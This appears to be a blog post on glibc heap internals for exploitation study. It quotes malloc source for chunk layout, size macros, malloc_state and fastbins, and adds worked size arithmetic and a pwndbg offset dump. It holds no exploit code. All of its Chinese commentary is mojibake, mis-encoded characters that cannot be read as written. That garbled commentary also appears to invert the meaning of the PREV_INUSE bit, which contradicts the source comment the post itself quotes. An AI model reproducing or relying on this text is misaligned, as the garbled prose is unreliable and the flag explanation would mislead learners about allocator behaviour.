<hr>
<p>title: Basic Heap<br>date: 2022-10-20 22:25:00<br>updated: 2022-10-20 22:25:01<br>tags: </p>
<ul>
<li>glibc source code<br>categories: </li>
<li>[pwn, heap]<br>excerpt: æˆ‘å¥½èœå•Šï¼ï¼ï¼ å‘œå‘œå‘œğŸ˜­</li>
</ul>
<hr>
<h1 id="Basic-Heap"><a href="#Basic-Heap" class="headerlink" title="Basic Heap"></a>Basic Heap</h1><h2 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><pre><code class="c">/* 
x64 -&gt; 8
x86 -&gt; 4
*/
#define INTERNAL_SIZE_T size_t
#define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))
#define MALLOC_ALIGNMENT       (2 *SIZE_SZ)
#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)
/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a &quot;view&quot; into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/

struct malloc_chunk {
    
    INTERNAL_SIZE_T prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T size;       /* Size in bytes, including overhead. */

    struct malloc_chunk *fd;         /* double links -- used only if free. */
    struct malloc_chunk *bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk *fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk *bk_nextsize;
};

typedef struct malloc_chunk *mbinptr;
typedef struct malloc_chunk *mchunkptr;
typedef struct malloc_chunk *mfastbinptr;
</code></pre>
<ul>
<li>prev_size ï¼šå¦‚æœä¸Šä¸€ä¸ªchunkå¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œç”¨äºè¡¨ç¤ºå…¶å¤§å°</li>
<li>sizeï¼šè¡¨ç¤ºå½“å‰ chunk çš„å¤§å°</li>
<li>fd, bkï¼šä»…åœ¨å½“å‰chunkè¢«é‡Šæ”¾æ—¶æœ‰æ•ˆï¼Œç”¨æ¥è¡¨ç¤ºé“¾è¡¨ä¸­çš„ä¸Šä¸€ä¸ªchunkåŠä¸‹ä¸€ä¸ªchunk</li>
<li>fd_nextsizeï¼Œbk_nextsizeï¼šä»…åœ¨å½“å‰chunkè¢«é‡Šæ”¾æ—¶æœ‰æ•ˆï¼Œç”¨æ¥è¡¨ç¤ºé“¾è¡¨ä¸­çš„ä¸Šä¸€ä¸ªä¸åŒå¤§å°çš„chunkåŠä¸‹ä¸€ä¸ªä¸åŒå¤§å°çš„chunk</li>
</ul>
<pre><code class="c">/*
   malloc_chunk details:

    (The following includes lightly edited explanations by Colin Plumb.)

    Chunks of memory are maintained using a `boundary tag&#39; method as
    described in e.g., Knuth or Standish.  (See the paper by Paul
    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a
    survey of such techniques.)  Sizes of free chunks are stored both
    in the front of each chunk and at the end.  This makes
    consolidating fragmented chunks into bigger chunks very fast.  The
    size fields also hold bits representing whether chunks are free or
    in use.

    An allocated chunk looks like this:


    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     |A|M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             User data starts here...                          .
        .                                                               .
        .             (malloc_usable_size() bytes)                      .
        .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             (size of chunk, but used for application data)    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|1|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of
    the malloc code, but &quot;mem&quot; is the pointer that is returned to the
    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.

    Chunks always begin on even word boundaries, so the mem portion
    (which is returned to the user) is also on an even word boundary, and
    thus at least double-word aligned.

    Free chunks are stored in circular doubly-linked lists, and look like this:

    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:&#39; |             Size of chunk, in bytes                     |A|0|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Forward pointer to next chunk in list             |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Back pointer to previous chunk in list            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Unused space (may be 0 bytes long)                .
        .                                                               .
        .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:&#39; |             Size of chunk, in bytes                           |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|0|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    The P (PREV_INUSE) bit, stored in the unused low-order bit of the
    chunk size (which is always a multiple of two words), is an in-use
    bit for the *previous* chunk.  If that bit is *clear*, then the
    word before the current chunk size contains the previous chunk
    size, and can be used to find the front of the previous chunk.
    The very first chunk allocated always has this bit set,
    preventing access to non-existent (or non-owned) memory. If
    prev_inuse is set for any given chunk, then you CANNOT determine
    the size of the previous chunk, and might even get a memory
    addressing fault when trying to do so.

    The A (NON_MAIN_ARENA) bit is cleared for chunks on the initial,
    main arena, described by the main_arena variable.  When additional
    threads are spawned, each thread receives its own arena (up to a
    configurable limit, after which arenas are reused for multiple
    threads), and the chunks in these arenas have the A bit set.  To
    find the arena for a chunk on such a non-main arena, heap_for_ptr
    performs a bit mask operation and indirection through the ar_ptr
    member of the per-heap header heap_info (see arena.c).

    Note that the `foot&#39; of the current chunk is actually represented
    as the prev_size of the NEXT chunk. This makes it easier to
    deal with alignments etc but can be very confusing when trying
    to extend or adapt this code.

    The three exceptions to all this are:

     1. The special chunk `top&#39; doesn&#39;t bother using the
    trailing size field since there is no next contiguous chunk
    that would have to index off it. After initialization, `top&#39;
    is forced to always exist.  If it would become less than
    MINSIZE bytes long, it is replenished.

     2. Chunks allocated via mmap, which have the second-lowest-order
    bit M (IS_MMAPPED) set in their size fields.  Because they are
    allocated one-by-one, each must contain its own trailing size
    field.  If the M bit is set, the other bits are ignored
    (because mmapped chunks are neither in an arena, nor adjacent
    to a freed chunk).  The M bit is also used for chunks which
    originally came from a dumped heap via malloc_set_state in
    hooks.c.

     3. Chunks in fastbins are treated as allocated chunks from the
    point of view of the chunk allocator.  They are consolidated
    with their neighbors only in bulk, in malloc_consolidate.
*/
</code></pre>
<h3 id="size-dependent"><a href="#size-dependent" class="headerlink" title="size dependent"></a>size dependent</h3><pre><code class="c">/* The smallest possible chunk */
// æœ€å°çš„ chunk å¤§å°
#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))
/* The smallest size we can malloc is an aligned minimal chunk */
#define MINSIZE  \
  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))

/*
MIN_CHUNK_SIZE -&gt; 0x20
0000 0000 0000 0000 0000 0000 0010 0000

MALLOC_ALIGN_MASK -&gt; 0xf
0000 0000 0000 0000 0000 0000 0000 1111

~MALLOC_ALIGN_MASK -&gt; -0x10
1111 1111 1111 1111 1111 1111 1111 0000

MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK
0000 0000 0000 0000 0000 0000 0010 1111

(MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK
1111 1111 1111 1111 1111 1111 1111 0000
0000 0000 0000 0000 0000 0000 0010 1111
0000 0000 0000 0000 0000 0000 0010 0000  -&gt; 0x20
*/
// è®¡ç®—è¯·æ±‚çš„å¤§å°
#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)


malloc(0x1) -&gt; 0x20;
malloc(0x21) -&gt; 0x30
    0x21 + 0x8 + 0xf = 0x38
    0011 1000
    1111 0000
    0011 0000 = 0x30
malloc(0x28) -&gt; 0x30
    0x28 + 0x8 + 0xf = 0x3f
    0011 1111
    1111 0000
    0011 0000 = 0x30
malloc(0x29) -&gt; 0x40
    0x29 + 0x8 + 0xf = 0x40
    0100 0000
    1111 0000
    0100 0000 = 0x40

0x19 ~ 0x28  -&gt;  0x30
0x29 ~ 0x38  -&gt;  0x40
</code></pre>
<pre><code>è¡¥ç ï¼š1111 1111 1111 1111 1111 1111 1111 0000
åç ï¼š1111 1111 1111 1111 1111 1111 1110 1111
åŸç ï¼š1000 0000 0000 0000 0000 0000 0001 0000
</code></pre>
<p>åœ¨ size å­—æ®µä¸­ç”±äº <code>&amp; ~MALLOC_ALIGN_MASK</code>,æˆ‘ä»¬ä¼šå‘ç°å®ƒçš„åå››ä¸ªæ¯”ç‰¹ä½ä¸€ç›´ä¸º0ï¼Œå…¶ä¸­å3ä¸ªæ¯”ç‰¹ä½è¢«ç”¨ä½œæ ‡è¯†ï¼Œä»é«˜åˆ°ä½åˆ†åˆ«æ„å‘³ç€</p>
<ul>
<li>NON_MAIN_ARENAï¼šè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹</li>
<li>IS_MMAPPEDï¼šç”¨äºæ ‡è¯†ä¸€ä¸ªchunkæ˜¯å¦æ˜¯ä»mmap()å‡½æ•°ä¸­è·å¾—çš„ã€‚å¦‚æœç”¨æˆ·ç”³è¯·ä¸€ä¸ªç›¸å½“å¤§çš„å†…å­˜ï¼Œmallocä¼šé€šè¿‡ mmap()å‡½æ•°åˆ†é…ä¸€ä¸ªæ˜ å°„æ®µã€‚</li>
<li>PREV_INUSEï¼šç”¨äºæ ‡è¯†ä¸Šä¸€ä¸ªchunkçš„çŠ¶æ€ã€‚å½“å®ƒä¸º1 æ—¶ï¼Œè¡¨ç¤ºä¸Šä¸€ä¸ªchunkå¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œå¦åˆ™è¡¨ç¤ºä¸Šä¸€ä¸ªchunkå¤„äºä½¿ç”¨çŠ¶æ€ã€‚</li>
</ul>
<pre><code class="c">/* size field is or&#39;ed with PREV_INUSE when previous adjacent chunk in use */
#define PREV_INUSE 0x1

/* extract inuse bit of previous chunk */
#define prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)


/* size field is or&#39;ed with IS_MMAPPED if the chunk was obtained with mmap() */
#define IS_MMAPPED 0x2

/* check for mmap()&#39;ed chunk */
#define chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)


/* size field is or&#39;ed with NON_MAIN_ARENA if the chunk was obtained
   from a non-main arena.  This is only set immediately before handing
   the chunk to the user, if necessary.  */
#define NON_MAIN_ARENA 0x4

/* Check for chunk from main arena.  */
#define chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)

/* Mark a chunk as not being on the main arena.  */
#define set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)


/*
   Bits to mask off when extracting size

   Note: IS_MMAPPED is intentionally not masked off from size field in
   macros for which mmapped chunks should never be seen. This should
   cause helpful core dumps to occur if it is tried by accident by
   people extending or adapting this malloc.
 */
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)

/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p)         ((p)-&gt;mchunk_size)

/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))

/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)-&gt;mchunk_prev_size)

/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */
#define set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))

/* extract p&#39;s inuse bit */
#define inuse(p)                                  \
  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)

/* set/clear chunk as being inuse without otherwise disturbing */
#define set_inuse(p)                                  \
  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE

#define clear_inuse(p)                                  \
  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)


/* check/set/clear inuse bits in known places */
#define inuse_bit_at_offset(p, s)                          \
  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)

#define set_inuse_bit_at_offset(p, s)                          \
  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)

#define clear_inuse_bit_at_offset(p, s)                          \
  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))


/* Set size at head, without disturbing its use bit */
#define set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))

/* Set size/use field */
#define set_head(p, s)       ((p)-&gt;mchunk_size = (s))

/* Set size at footer (only when chunk is not in use) */
#define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))
</code></pre>
<p><img src="Heap.assets/image-20221018115053387.png" alt="image-20221018115053387"></p>
<pre><code class="c">void* malloc (size_t size);
void free (void* ptr);
</code></pre>
<p><img src="Heap.assets/image-20221018120411190.png" alt="image-20221018120411190"></p>
<pre><code class="c">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
</code></pre>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>æ¯ä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ª arena headerï¼Œ é‡Œé¢ä¿å­˜äº†bins ï¼Œtop chunkç­‰ä¿¡æ¯ã€‚ä¸»çº¿ç¨‹çš„main_arenaä¿å­˜åœ¨libc.soçš„æ•°æ®æ®µé‡Œï¼Œå…¶ä»–çº¿ç¨‹çš„arena åˆ™ä¿å­˜åœ¨ç»™è¯¥arenaåˆ†é…çš„heapé‡Œé¢ã€‚malloc_stateå®šä¹‰å¦‚ä¸‹</p>
<pre><code class="c">
/*
   have_fastchunks indicates that there are probably some fastbin chunks.
   It is set true on entering a chunk into any fastbin, and cleared early in
   malloc_consolidate.  The value is approximate since it may be set when there
   are no fastbin chunks, or it may be clear even if there are fastbin chunks
   available.  Given it&#39;s sole purpose is to reduce number of redundant calls to
   malloc_consolidate, it does not affect correctness.  As a result we can safely
   use relaxed atomic accesses.
 */


struct malloc_state {
    /* Serialize access.  */
    __libc_lock_define (, mutex);

    /* Flags (formerly in max_fast).  */
    int flags;

    /* Set if the fastbin chunks contain recently inserted free blocks.  */
    /* Note this is a bool but not all targets support atomics on booleans.  */
    int have_fastchunks;

    /* Fastbins */
    mfastbinptr fastbinsY[NFASTBINS];

    /* Base of the topmost chunk -- not otherwise kept in a bin */
    mchunkptr top;

    /* The remainder from the most recent split of a small request */
    mchunkptr last_remainder;

    /* Normal bins packed as described above */
    mchunkptr bins[NBINS * 2 - 2];

    /* Bitmap of bins */
    unsigned int binmap[BINMAPSIZE];

    /* Linked list */
    struct malloc_state *next;

    /* Linked list for free arenas.  Access to this field is serialized
       by free_list_lock in arena.c.  */
    struct malloc_state *next_free;

    /* Number of threads attached to this arena.  0 if the arena is on
       the free list.  Access to this field is serialized by
       free_list_lock in arena.c.  */
    INTERNAL_SIZE_T attached_threads;

    /* Memory allocated from the system in this arena.  */
    INTERNAL_SIZE_T system_mem;
    INTERNAL_SIZE_T max_system_mem;
};


/* There are several instances of this struct (&quot;arenas&quot;) in this
   malloc.  If you are adapting this malloc in a way that does NOT use
   a static or mmapped malloc_state, you MUST explicitly zero-fill it
   before using. This malloc relies on the property that malloc_state
   is initialized to all zeroes (as is true of C statics).  */

static struct malloc_state main_arena =
        {
                .mutex = _LIBC_LOCK_INITIALIZER,
                .next = &amp;main_arena,
                .attached_threads = 1
        };
</code></pre>
<pre><code class="c">pwndbg&gt; ptype /o struct malloc_state
/* offset      |    size */  type = struct malloc_state {
/*      0      |       4 */    __libc_lock_t mutex;
/*      4      |       4 */    int flags;
/*      8      |       4 */    int have_fastchunks;
/* XXX  4-byte hole      */
/*     16      |      80 */    mfastbinptr fastbinsY[10];
/*     96      |       8 */    mchunkptr top;
/*    104      |       8 */    mchunkptr last_remainder;
/*    112      |    2032 */    mchunkptr bins[254];
/*   2144      |      16 */    unsigned int binmap[4];
/*   2160      |       8 */    struct malloc_state *next;
/*   2168      |       8 */    struct malloc_state *next_free;
/*   2176      |       8 */    size_t attached_threads;
/*   2184      |       8 */    size_t system_mem;
/*   2192      |       8 */    size_t max_system_mem;

                               /* total size (bytes): 2200 */
                             }
</code></pre>
<p><img src="Heap.assets/image-20221018191719463.png" alt="image-20221018191719463"></p>
<ul>
<li><p>mutexï¼šåºåˆ—åŒ–å¯¹ä¸€ä¸ªç«æŠ€åœºçš„è®¿é—®ã€‚Mallocåœ¨å‘ arena è¯·æ±‚å †å†…å­˜ä¹‹å‰é”å®šäº† arena çš„ mutex</p>
</li>
<li><p>flagsï¼šä¿å­˜ä¿¡æ¯ï¼Œå¦‚ä¸€ä¸ª arena çš„å †å†…å­˜æ˜¯å¦è¿ç»­ç­‰</p>
</li>
<li><p>have_fastchunksï¼šè¢«è§†ä¸ºä¸€ä¸ª bool å€¼ï¼Œè¡¨ç¤º fastbins æ˜¯å¦ä¸ºç©ºï¼Œå½“ä¸€ä¸ªå—è¢«é“¾æ¥åˆ°ä¸€ä¸ª fastbin ä¸­æ—¶è¢«è®¾ç½®ï¼Œå¹¶ç”± malloc_consolidate() æ¸…é™¤ è¿™ä¸ªå­—æ®µå’Œå®ƒåé¢çš„å¡«å……DWORDåªå­˜åœ¨äºGLIBCç‰ˆæœ¬&gt;=2.27ã€‚åœ¨GLIBCç‰ˆæœ¬&lt;=2.26ä¸­ï¼Œå®ƒæ˜¯flagså­—æ®µçš„ä¸€éƒ¨åˆ†ã€‚</p>
</li>
<li><p>fastbinsY[NFASTBINS]ï¼šå­˜æ”¾æ¯ä¸ª fast chunk é“¾è¡¨å¤´éƒ¨çš„æŒ‡é’ˆã€‚å°½ç®¡åœ¨é»˜è®¤æƒ…å†µä¸‹åªæœ‰7ä¸ªè¿™æ ·çš„fastbinså¯ç”¨ï¼Œä½† mallopt() å‡½æ•°å¯ä»¥é€šè¿‡ä¿®æ”¹ global_max_fast å˜é‡æ¥æ”¹å˜è¿™ä¸ªæ•°å­—ã€‚</p>
</li>
<li><p>topï¼štop chunk æ˜¯æœ€é¡¶éƒ¨çš„å¯ç”¨ chunkï¼Œå³ä¸å¯ç”¨å†…å­˜çš„æœ«ç«¯æ¥å£¤çš„é‚£ä¸ªï¼Œåœ¨ä¸€ä¸ªæ–°çš„ arena è¢«åˆå§‹åŒ–åï¼Œä¸€ä¸ª top chunk æ€»æ˜¯å­˜åœ¨çš„ï¼Œè€Œä¸”æ¯ä¸ª arena åªæœ‰ä¸€ä¸ªã€‚åªæœ‰å½“è¯·æ±‚æ— æ³•ä»åŒä¸€ arena çš„ä»»ä½•å…¶ä»– bin ä¸­å¾—åˆ°æœåŠ¡æ—¶ï¼Œæ‰ä¼šä» top chunk ä¸­å¾—åˆ°æœåŠ¡ã€‚å½“ä¸€ä¸ª top chunk å¤ªå°ï¼Œæ— æ³•æ»¡è¶³ä½äº mmap é˜ˆå€¼çš„è¯·æ±‚æ—¶ï¼Œmalloc ä¼šå°è¯•é€šè¿‡ sysmalloc() å‡½æ•°å¢åŠ  top chunk æ‰€åœ¨çš„å †ï¼Œç„¶åæ‰©å±• top chunkã€‚å¦‚æœä¸æˆåŠŸï¼Œå°±ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„å †ï¼Œæˆä¸ºè¯¥ arena çš„ top chunkï¼Œè€Œæ—§çš„t op chunk ä¸­çš„ä»»ä½•å‰©ä½™å†…å­˜éƒ½ä¼šè¢«é‡Šæ”¾ã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œmallocåœ¨å †çš„æœ«ç«¯æ”¾ç½®äº†2ä¸ª0x10å¤§å°çš„ â€œæ …æ æŸ± â€œå—ï¼Œä»¥ç¡®ä¿å‘å‰åˆå¹¶çš„å°è¯•ä¸ä¼šå¯¼è‡´è¶Šç•Œè¯»å–ã€‚</p>
</li>
<li><p>last_remainderï¼šè¿™ä¸ªå­—æ®µæŒæœ‰å‰ä¸€ä¸ªåˆ‡å‰²æ“ä½œäº§ç”Ÿçš„å—çš„åœ°å€ã€‚å®ƒç”±å±äº smallbin èŒƒå›´çš„è¯·æ±‚å¡«å……ï¼Œè¯¥è¯·æ±‚æ¥è‡ª unsorted bin (æ¥è‡ªç°æœ‰çš„ last_remainder)ï¼Œæˆ–æ¥è‡ªbinmapæœç´¢ã€‚è¦ä»ä¸€ä¸ª unsorted bin ä¸­è¿›è¡Œåˆ‡å‰²ï¼Œæœ€åçš„å‰©ä½™å—å¿…é¡»ä½äº unsorted binçš„å¤´éƒ¨ã€‚</p>
<p>åˆ†å‰²ï¼šä¾‹å¦‚ï¼Œåœ¨è¯·æ±‚ä¸€ä¸ª0x100å¤§å°çš„å—æ—¶ï¼Œå¦‚æœçº¿ç¨‹çš„ arena åªæœ‰ä¸€ä¸ª0x300å¤§å°çš„å—å¯ä»¥æä¾›ï¼Œ mallocå°†ä»å®ƒçš„ç©ºé—²åˆ—è¡¨ä¸­è§£å¼€0x300å—ï¼Œä»ä¸­åˆ†å‰²å‡ºä¸€ä¸ª0x100å—ï¼Œå°†æ‰€è°“çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä¸€ä¸ª 0x200å¤§å°çš„å—ï¼‰é“¾æ¥åˆ°æœªæ’åºbinçš„å¤´éƒ¨ï¼Œç„¶ååˆ†é…0x100å—ã€‚</p>
<p>è€—å°½ï¼šå¦‚æœä¸€ä¸ªçº¿ç¨‹è¯·æ±‚ä¸€ä¸ª0x80å¤§å°çš„å—ï¼Œè€Œå®ƒçš„ arena åªæœ‰ä¸€ä¸ª0x90å¤§å°çš„å—å¯ç”¨ï¼Œmallocä¼šé€šè¿‡åˆ†é…æ•´ä¸ªå—è€Œä¸æ˜¯é‡æ–°åˆ†é…æ¥ â€œè€—å°½ â€œè¿™ä¸ª0x90å—ã€‚è¿™æ˜¯å› ä¸ºåœ¨ä»0x90å—ä¸­å–å‡º0x80å­—èŠ‚å ï¼Œæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ç•™ç»™ä¸€ä¸ªæœ€å°å°ºå¯¸çš„å—ã€‚</p>
</li>
<li><p>bins[NBINS * 2 - 2]ï¼šç”¨äºå­˜å‚¨ unstored binï¼Œsmall bins å’Œ large bins çš„ chunk é“¾è¡¨ã€‚</p>
</li>
<li><p>binmap[BINMAPSIZE]ï¼šbinmap æ˜¯ä¸ªä½å‘é‡ï¼Œå®ƒå¯ä»¥è¡¨ç¤º arena çš„ smallbins å’Œ largebins å“ªäº›è¢«å ç”¨ã€‚å½“ä¸€ä¸ªè¯·æ±‚æ— æ³•ä»å…¶ç›¸åº”çš„ bin ä¸­å¾—åˆ°æœåŠ¡æ—¶ã€‚å®ƒè¢«mallocç”¨æ¥å¿«é€Ÿæ‰¾åˆ°ä¸‹ä¸€ä¸ªæœ€å¤§çš„ã€ä¸”æœ‰å€¼çš„ binã€‚Binmapæœç´¢å‘ç”Ÿåœ¨ä¸æˆåŠŸçš„unsortedbinæˆ–largebinæœç´¢ä¹‹åï¼Œè¿™å–å†³äºè¯·æ±‚å¤§å°ã€‚Mallocæ‰¾åˆ°ä¸‹ä¸€ä¸ªæœ€å¤§çš„ã€è¢«å ç”¨çš„binï¼Œå¹¶è€—å°½/åˆ‡å‰² è¯¥binä¸­çš„æœ€åä¸€ä¸ªå—ï¼Œåœ¨åä¸€ç§æƒ…å†µä¸‹ï¼Œå¦‚æœè¯·æ±‚æ˜¯åœ¨small binèŒƒå›´å†…ï¼Œå‰©ä½™éƒ¨åˆ†è¢«å†™å…¥ last_remainderã€‚</p>
</li>
<li><p>nextï¼šarena çš„å•é“¾å¾ªç¯åˆ—è¡¨çš„ä¸‹ä¸€ä¸ªã€‚</p>
</li>
<li><p>*next_freeï¼šä¸€ä¸ªå•é“¾çš„ã€éå¾ªç¯çš„è‡ªç”± arena åˆ—è¡¨ï¼ˆæ²¡æœ‰è¿æ¥çº¿ç¨‹çš„ arenaï¼‰ã€‚</p>
</li>
<li><p>attached_threadsï¼šåŒæ—¶ä½¿ç”¨è¿™ä¸ªç«æŠ€åœºçš„çº¿ç¨‹æ•°é‡ã€‚</p>
</li>
<li><p>system_memï¼šç›®å‰è¯¥ arena æ˜ å°„çš„å¯å†™å†…å­˜æ€»é‡ã€‚</p>
</li>
<li><p>max_system_memï¼šè¿™ä¸ª arena åœ¨ä»»ä½•æ—¶å€™æ‰€æ˜ å°„çš„æœ€å¤§çš„å¯å†™å†…å­˜é‡ã€‚</p>
</li>
</ul>
<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><pre><code class="c">/*
   Fastbins

    An array of lists holding recently freed small chunks.  Fastbins
    are not doubly linked.  It is faster to single-link them, and
    since chunks are never removed from the middles of these lists,
    double linking is not necessary. Also, unlike regular bins, they
    are not even processed in FIFO order (they use faster LIFO) since
    ordering doesn&#39;t much matter in the transient contexts in which
    fastbins are normally used.

    Chunks in fastbins keep their inuse bit set, so they cannot
    be consolidated with other free chunks. malloc_consolidate
    releases all chunks in fastbins and consolidates them with
    other free chunks.
 */

#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])

/* offset 2 to use otherwise unindexable first 2 bins */
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)

/*
    0x30 = 0011 0000 &gt;&gt; 4 -&gt; 0000 0011 -&gt; 3 - 2 = 1
    0xa0 = 1010 0000 &gt;&gt; 4 -&gt; 0000 1010 -&gt; 10 - 2 = 8
*/


/* The maximum fastbin request size we support */
#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)

#define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)
</code></pre>
<pre><code class="c">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
/*
   Set value of max_fast.
   Use impossibly small value if 0.
   Precondition: there are no existing fastbin chunks.
   Setting the value clears fastchunk bit but preserves noncontiguous bit.
 */

#define set_max_fast(s) \
  global_max_fast = (((s) == 0)                              \
                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))
#define get_max_fast() global_max_fast

/* Maximum size of memory handled in fastbins.  */
static INTERNAL_SIZE_T global_max_fast;

#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)

static void malloc_init_state(mstate av) {
    ...
    if (av == &amp;main_arena)
        set_max_fast (DEFAULT_MXFAST);
    ...
}
</code></pre>
<p><img src="Heap.assets/image-20221018141013527.png" alt="image-20221018141013527"></p>
